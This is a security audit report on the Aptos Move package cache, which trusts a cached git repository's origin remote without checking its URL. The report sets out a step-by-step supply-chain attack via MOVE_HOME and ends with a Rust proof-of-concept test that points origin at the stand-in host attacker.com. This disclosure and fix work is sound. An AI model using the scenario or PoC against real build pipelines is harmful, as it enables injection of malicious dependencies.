# Audit Report

## Title
Package Cache Remote URL Validation Missing - Supply Chain Attack via Compromised Git Cache

## Summary
The `resolve_git_revision()` function in the Move package resolver trusts cached git repositories without validating that their configured remote URL matches the expected repository URL. An attacker who can control the `MOVE_HOME` environment variable or gain write access to the package cache directory can inject malicious git repositories, causing the resolver to fetch and lock commits from attacker-controlled servers instead of legitimate sources.

## Finding Description

The vulnerability exists in the git repository caching mechanism used by the Move package resolver. When resolving a git dependency, the code path flows as follows:

1. `PackageLock::resolve_git_revision()` calls `PackageCache::resolve_git_revision()` to resolve a branch/tag name to a commit OID [1](#0-0) 

2. `PackageCache::resolve_git_revision()` calls `clone_or_update_git_repo()` to ensure the repository is cached locally [2](#0-1) 

3. When a cached repository already exists at the expected path, the code opens it and fetches from its "origin" remote **without validating that the origin URL matches the requested `git_url` parameter** [3](#0-2) 

4. The revision is resolved against whatever data was fetched, and the resulting commit OID is locked [4](#0-3) 

The cache directory location is determined by the `MOVE_HOME` environment variable, which defaults to `~/.move` if not set [5](#0-4) 

**Attack Scenario:**

1. Attacker compromises a CI/CD configuration file and injects: `MOVE_HOME=/attacker/controlled/path`
2. Attacker pre-populates `/attacker/controlled/path/git/repos/` with malicious bare git repositories
3. These malicious repositories have their "origin" remote pointing to attacker-controlled git servers
4. When a developer or CI system builds a Move package with git dependencies, the package resolver uses the malicious cache
5. The code finds the existing cached repository, opens it, and fetches from the attacker's server
6. Malicious commit OIDs are resolved and locked in `Move.lock`
7. Subsequent builds use these locked malicious commits, achieving persistent code injection
8. If the compromised package is published on-chain, malicious Move bytecode executes in the Aptos VM

This breaks the fundamental security guarantee that packages are fetched from their declared git repositories, enabling supply chain attacks.

## Impact Explanation

This vulnerability enables **supply chain attacks** against Move package development:

- **High Severity** per Aptos bug bounty criteria (significant protocol violations)
- Malicious Move modules can be injected into dependencies during the build process
- If compromised packages are deployed on-chain, this could lead to:
  - Theft of user funds via backdoored smart contracts
  - Unauthorized access to resources
  - Manipulation of on-chain state
- The lock file persistence means the attack survives across builds
- Affects all downstream dependencies that trust the compromised package

While this is a development-time vulnerability rather than a runtime consensus issue, it creates a critical attack vector for injecting malicious code into the Aptos ecosystem. The impact could escalate to **Critical Severity** if exploited to deploy contracts that steal funds.

## Likelihood Explanation

**Likelihood: Medium to High** in enterprise and CI/CD environments

**Attack Prerequisites:**
- Ability to set the `MOVE_HOME` environment variable, OR
- Write access to the package cache directory (typically `~/.move`)

**Realistic Attack Vectors:**
1. **CI/CD Environment Manipulation**: Attackers who compromise CI configuration files (often stored in version control) can inject environment variables
2. **Shared Build Servers**: Malicious users on multi-tenant build infrastructure can pre-populate cache directories
3. **Developer Machine Compromise**: Malware or compromised scripts can modify the cache directory
4. **Container/VM Escape**: In containerized build environments, attackers may exploit misconfigurations to access host filesystems

The attack is particularly realistic in CI/CD pipelines where environment variables are frequently used for configuration and may be less scrutinized than source code changes.

## Recommendation

**Fix: Validate Remote URL Before Using Cached Repository**

Before fetching from a cached repository, verify that its configured "origin" remote URL matches the requested `git_url`:

```rust
let repo = if repo_path.exists() {
    self.listener.on_repo_update_start(git_url.as_str());
    
    let repo = Repository::open_bare(&repo_path)?;
    
    // SECURITY FIX: Validate that the cached repo's origin matches the expected URL
    {
        let remote = repo.find_remote("origin")?;
        let remote_url = remote.url().ok_or_else(|| anyhow!("Remote has no URL"))?;
        let expected_canonical = CanonicalGitIdentity::new(git_url)?;
        let actual_canonical = CanonicalGitIdentity::new(&Url::parse(remote_url)?)?;
        
        if expected_canonical != actual_canonical {
            // Cached repo has wrong origin - delete and re-clone
            drop(repo);
            drop(remote);
            fs::remove_dir_all(&repo_path)?;
            return Box::pin(self.clone_or_update_git_repo(git_url)).await;
        }
    }
    
    // Proceed with fetch...
    {
        let mut remote = repo.find_remote("origin")?;
        remote.fetch(...)...
```

**Alternative: Use Cache Directory Permissions**
- Document that `MOVE_HOME` must be protected from unauthorized write access
- Add runtime warnings if cache directory has unsafe permissions
- Consider using a cryptographic signature scheme to verify cache integrity

## Proof of Concept

```rust
// PoC demonstrating the vulnerability
// This test shows that a malicious cached repository with wrong origin URL
// will be used without validation

use move_package_cache::PackageCache;
use move_package_resolver::lock::PackageLock;
use git2::Repository;
use url::Url;
use std::path::PathBuf;
use tempfile::TempDir;

#[tokio::test]
async fn test_malicious_cache_injection() {
    // 1. Setup: Create attacker-controlled cache directory
    let malicious_cache = TempDir::new().unwrap();
    let cache_path = malicious_cache.path();
    
    // 2. Simulate legitimate repository URL
    let legitimate_url = Url::parse("https://github.com/aptos-labs/aptos-core.git").unwrap();
    
    // 3. Attacker creates malicious repository in cache
    let canonical_identity = move_package_cache::CanonicalGitIdentity::new(&legitimate_url).unwrap();
    let malicious_repo_path = cache_path
        .join("git")
        .join("repos")
        .join(canonical_identity.to_string());
    
    std::fs::create_dir_all(&malicious_repo_path).unwrap();
    
    // 4. Initialize bare repo with MALICIOUS origin
    let repo = Repository::init_bare(&malicious_repo_path).unwrap();
    repo.remote("origin", "https://attacker.com/malicious.git").unwrap();
    
    // 5. Victim attempts to resolve git revision
    let package_cache = PackageCache::new(cache_path).unwrap();
    let mut package_lock = PackageLock::new();
    
    // 6. VULNERABILITY: This will fetch from attacker.com instead of github.com
    // No validation occurs - the cached repo's origin URL is trusted
    let result = package_lock
        .resolve_git_revision(&package_cache, &legitimate_url, "main")
        .await;
    
    // The fetch will fail (attacker.com doesn't exist), but demonstrates
    // that the code attempts to use the malicious repository without validation
    assert!(result.is_err()); // Fails due to network, not validation
    
    // In a real attack, attacker.com would serve malicious commits
    // and the resolution would succeed, locking the malicious commit OID
}
```

**Notes**

1. This vulnerability exists in the `move-package-resolver` component which appears to be a newer implementation using the git2 library and `PackageCache` abstraction. The legacy Move package resolution system in `move-package/src/resolution/` uses git CLI commands and may have different security properties.

2. The `move-package-resolver` crate is currently not used by any production components in the codebase (verified via dependency analysis). However, if this code is intended for future deployment, the vulnerability should be fixed before integration.

3. The cache directory canonicalization and path construction mechanisms [6](#0-5)  are generally sound against path traversal attacks, but do not prevent the core issue of remote URL substitution.

4. The vulnerability specifically impacts build reproducibility and package integrity, which are critical for decentralized systems where developers must trust that dependencies have not been tampered with.

### Citations

**File:** third_party/move/tools/move-package-resolver/src/lock.rs (L78-78)
```rust
                let oid = package_cache.resolve_git_revision(git_url, rev).await?;
```

**File:** third_party/move/tools/move-package-cache/src/package_cache.rs (L137-153)
```rust
        let repo = if repo_path.exists() {
            // If the repo already exists, update it.
            self.listener.on_repo_update_start(git_url.as_str());

            let repo = Repository::open_bare(&repo_path)?;
            {
                let mut remote = repo.find_remote("origin")?;
                // Fetch all remote branches and map them to local remote-tracking branches
                // - refs/heads/*: fetch all remote branches
                // - refs/remotes/origin/*: store them as local remote-tracking branches under origin/
                remote
                    .fetch(
                        &["refs/heads/*:refs/remotes/origin/*"],
                        Some(&mut fetch_options),
                        None,
                    )
                    .map_err(|err| anyhow!("Failed to update git repo at {}: {}", git_url, err))?;
```

**File:** third_party/move/tools/move-package-cache/src/package_cache.rs (L187-187)
```rust
        let repo = self.clone_or_update_git_repo(git_url).await?;
```

**File:** third_party/move/tools/move-package-cache/src/package_cache.rs (L189-199)
```rust
        let obj = repo
            .repo
            .revparse_single(&format!("origin/{}", rev))
            .map_err(|_err| {
                anyhow!(
                    "Failed to resolve rev string \"{}\" in repo {}",
                    rev,
                    git_url
                )
            })?;
        let oid = obj.id();
```

**File:** third_party/move/move-command-line-common/src/env.rs (L48-57)
```rust
pub static MOVE_HOME: Lazy<String> = Lazy::new(|| {
    std::env::var("MOVE_HOME").unwrap_or_else(|_| {
        format!(
            "{}/.move",
            dirs_next::home_dir()
                .expect("user's home directory not found")
                .to_str()
                .unwrap()
        )
    })
```

**File:** third_party/move/tools/move-package-cache/src/canonical.rs (L11-38)
```rust
/// Canonicalized identity of a git repository, derived from a [`Url`].
/// - Ignores the scheme
/// - Converts host & path to lowercase
/// - Keeps port, but only if it is non-default
/// - Trims trailing slashes and `.git` suffix
#[derive(Debug, Clone, Eq, PartialEq, Ord, PartialOrd)]
pub struct CanonicalGitIdentity(String);

impl CanonicalGitIdentity {
    pub fn new(git_url: &Url) -> Result<Self> {
        let host = git_url
            .host_str()
            .ok_or_else(|| anyhow!("invalid git URL, unable to extract host: {}", git_url))?
            .to_ascii_lowercase();

        let port = match git_url.port() {
            Some(port) => match (git_url.scheme(), port) {
                ("http", 80) | ("https", 443) | ("ssh", 22) => "".to_string(),
                _ => format!(":{}", port),
            },
            None => "".to_string(),
        };

        let path = git_url.path().to_ascii_lowercase();
        let path = path.trim_end_matches("/").trim_end_matches(".git");

        Ok(Self(format!("{}{}{}", host, port, path)))
    }
```
